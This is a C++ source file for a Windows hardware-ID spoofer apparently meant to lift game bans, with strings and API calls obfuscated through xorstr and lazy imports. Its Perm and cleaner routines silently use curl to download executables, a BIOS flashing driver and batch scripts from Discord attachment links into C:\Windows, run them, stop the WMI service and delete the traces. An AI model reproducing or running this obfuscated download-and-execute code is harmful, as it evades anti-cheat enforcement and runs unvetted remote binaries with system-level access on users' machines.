#include <iostream>
#include "xorstr.h"
#include <thread>
#include <Windows.h>
#include <string>
#include "lazy.h"
#include "custom.h"
struct slowly_printing_stringg {
	std::string data;
	long int delay;
};

std::ostream& operator<<(std::ostream& out, const slowly_printing_stringg& s) {
	for (const auto& c : s.data) {
		out << c << std::flush;
		std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));
	}
	return out;
}

void system_UD(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = E("cmd.exe");
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)

		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);

}

namespace Spoof {

	void Perm()
	{
		ShowWindow(GetConsoleWindow(), SW_MAXIMIZE);
		LI_FN(system)(E("cls"));
		std::cout << slowly_printing_stringg{ "\n\n\n Please Wait While We Spoof Your PC This Window Will Close For 5 Seconds",50 };
		LI_FN(Beep)(500, 500);
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1045069577035464704/1047255168028266566/amifldrv64.sys -o C:\\Windows\\amifldrv64.sys --silent"));
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1045069577035464704/1047255167726260354/AMIDEWINx64.EXE -o C:\\Windows\\AMIDEWINx64.EXE --silent"));
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1069731480080756746/1086754138915885156/spoof_3.bat -o C:\\Windows\\spoof.bat --silent"));
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1050480602161365012/1050528877925117972/changevol.bat -o C:\\Windows\\changevol.bat --silent"));
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1050480602161365012/1050528878373904444/Volumeid64.exe -o C:\\Windows\\volumeid64.exe --silent"));
		LI_FN(system)(E("cls"));
		LI_FN(SetConsoleTitleA)(E("Walter Fn Perm Unban       Leave A Vouch If This Worked"));
		std::cout << slowly_printing_stringg{ "\n\n\n Press Any Key To Perm Spoof",50 };
		LI_FN(system)(E("pause >nul"));

		std::string serial;



		LI_FN(system)(E("cd C:\\Windows\\"));

		LI_FN(system)(E("C:\\Windows\\spoof.bat"));

		LI_FN(system)(E("cls"));
		LI_FN(ShowWindow)(LI_FN(GetConsoleWindow)(), SW_SHOW);
		LI_FN(system)(E("C:\\Windows\\changevol.bat"));
		LI_FN(system)(E("net stop winmgmt /Y >nul"));


		std::remove(E("C:\\Windows\\changevol.bat"));
		std::remove(E("C:\\Windows\\volumeid64.exe"));
		std::remove(E("C:\\Windows\\spoof.bat"));
		std::remove(E("C:\\Windows\\end.bat"));
		std::remove(E("del C:\\Windows\\amifldrv64.sys"));
		std::remove(E("C:\\Windows\\AMIDEWINx64.EXE"));
		LI_FN(system)(E("cls"));
	}

}

namespace Check {

	void checker()
	{
		LI_FN(Beep)(500, 500);
		LI_FN(system)(E("cls"));
		LI_FN(system)("color b");
		LI_FN(system)(E("echo BaseBoard SN:"));

		LI_FN(system)(E("wmic baseboard get serialnumber"));

		LI_FN(system)(E("echo Bios SN:"));

		LI_FN(system)(E("wmic bios get serialnumber"));

		LI_FN(system)(E("echo Cpu SN:"));

		LI_FN(system)(E("wmic cpu get serialnumber"));

		LI_FN(system)(E("echo DiskDrive SN:"));

		LI_FN(system)(E("wmic diskdrive get serialnumber"));

		LI_FN(system)(E("echo VolumeID SN:"));
		LI_FN(system)(E("vol | findstr Serial"));

		LI_FN(system)(E("echo Mac Addresses:"));

		LI_FN(system)(E("getmac"));

		std::cout << E("  ") << '\n';

		LI_FN(system)(E("echo -----------------------------------------------"));

		LI_FN(system)(E("echo Going back to Dashboard in 7 Seconds..."));

		LI_FN(system)(E("echo -----------------------------------------------"));
		LI_FN(Sleep)(7000);
	}
}

namespace Cleaner {
	
	void cleaner()
	{
		std::cout << slowly_printing_stringg{ "\n\n\n Cleaning You PC Please Wait...",50 };
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1047306944026787960/1047317556521865318/deepp_cleaner.exe -o C:\\Windows\\cleaner1.exe --silent"));
		LI_FN(system)(E("C:\\Windows\\cleaner1.exe"));
		std::remove(E("C:\\Windows\\cleaner1.exe"));
	}
}
